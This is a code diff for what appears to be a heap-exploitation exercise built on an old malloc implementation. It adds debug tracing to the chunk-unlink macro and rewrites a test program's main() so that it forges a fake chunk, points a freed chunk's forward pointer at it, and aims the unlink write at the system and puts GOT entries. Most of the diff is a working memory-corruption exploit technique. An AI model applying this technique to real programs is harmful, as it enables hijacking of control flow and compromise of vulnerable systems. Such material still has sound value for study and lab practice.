@@ -1155,7 +1155,7 @@ static void do_check_malloced_chunk(p, s) mchunkptr p; size_t s;
     else                                                                      \
     {                                                                         \
       while (FD != BK && S < chunksize(FD)) { \
-                                             fprintf(stderr, ">>> FD=%p FD->fd=%p\n", FD, FD->fd); fflush(stderr); \
+                                             fprintf(stderr, ">>> FD=%p S=%p chunksize(FD)=%p FD->fd=%p chunksize(FD->fd)=%08x\n", FD, S, chunksize(FD), FD->fd, chunksize(FD->fd)); fflush(stderr); \
                                              FD = FD->fd;                      \
                                              } \
       BK = FD->bk;                                                            \
@@ -1163,8 +1163,13 @@ static void do_check_malloced_chunk(p, s) mchunkptr p; size_t s;
     }                                                                         \
     fprintf(stderr, "[-] FD=%p BK=%p P->bk=%p P->fd=%p FD->bk=%p BK->fd=%p P=%p\n", FD, BK, P->bk, P->fd, FD->bk, BK->fd, P); fflush(stderr);    \
     P->bk = BK;                                                               \
+   fprintf(stderr, ">\n"); fflush(stderr); \
     P->fd = FD;                                                               \
-    FD->bk = BK->fd = P;                                                      \
+   fprintf(stderr, ">>\n"); fflush(stderr); \
+    FD->bk = P;                                                      \
+   fprintf(stderr, ">>>\n"); fflush(stderr); \
+   BK->fd = P;                                                      \
+   fprintf(stderr, ">>>>\n"); fflush(stderr); \
    fprintf(stderr, "[-] FD=%p BK=%p FD->bk(%x)=%p BK->fd(%x)=%p\n", FD, BK, &(FD->bk), FD->bk, &(BK->fd), BK->fd); fflush(stderr); \
   }                                                                           \
 }
@@ -2568,9 +2573,11 @@ void winner()
 int main(int argc, char **argv)
 {
   char *first, *second, *third, *fourth, *fifth, *sixth;
+  char *p;
+  char *fake_chunk;
   int i;
-  int puts_got = 0x0804b128;
-  int system_got = 0x0804c150;
+  int puts_got   = 0x0804c3b0;
+  int system_got = 0x0804c388;
 
   fprintf(stderr, "Allocating space for first\n"); fflush(stderr);
   first = malloc(50);
@@ -2585,30 +2592,36 @@ int main(int argc, char **argv)
   fprintf(stderr, "Allocating space for sixth\n"); fflush(stderr);
   sixth = malloc(12);
 
-  strcpy(first, argv[2]);
+  /*strcpy(first, argv[2]);*/
+  /* Copy in the code to `first` that is supposed to be a part of argv[2] */
+  p = first;
+  memset(p, 'A', 1);
+  p[10] = '\0';
   free(fifth);
 
+  /*strcpy(fourth, argv[1]);*/
+  /* Copy in the code to `fourth` that is supposed to be a part of argv[1] */
+  fake_chunk = fourth + 4;
+  p = fourth;
+  *((size_t *)p) = (size_t)0x48484848;    // PREV_SIZE
+  p += 4;
+  *((size_t *)p) = (size_t)0x0;    // SIZE
+  p += 4;
+  *((size_t *)p) = (size_t)0x49494949;    // FD
+  p += 4;
+  *((size_t *)p) = (size_t)system_got - 4;    // BK
+  p += 4;
 
+  /* Lets change the FD of `fifth` and change it to point to out fake chunk */
+  p = fifth;
+  *((void **)p) = fake_chunk;
 
-  /* ================================================================================================ */
-  /* Exploit code */
-  char *t = fourth;
-
-  int *tt;
-  i = fifth-fourth;    // at the data portion of `fifth` we have its FD and BK now that its been freed
-  t += i;
-
-  printf("t=%p\n", t);
-  tt = (int *)t;
-  *tt = (int)first - 8;
-  tt += 1;
-  *tt = (int)system_got;
-
-
-
-  /* Regular code */
-  strcpy(fourth, argv[1]);
   free(second);
+  p = second;
+  p -= 8;
+  *((int *)p) = 0xcccccccc;
+  p += 4;
+  *((int *)p) = 0xcccccccc;
 
   fprintf(stderr, "[x] About to call puts\n"); fflush(stderr);
   printf("dynamite failed?\n");
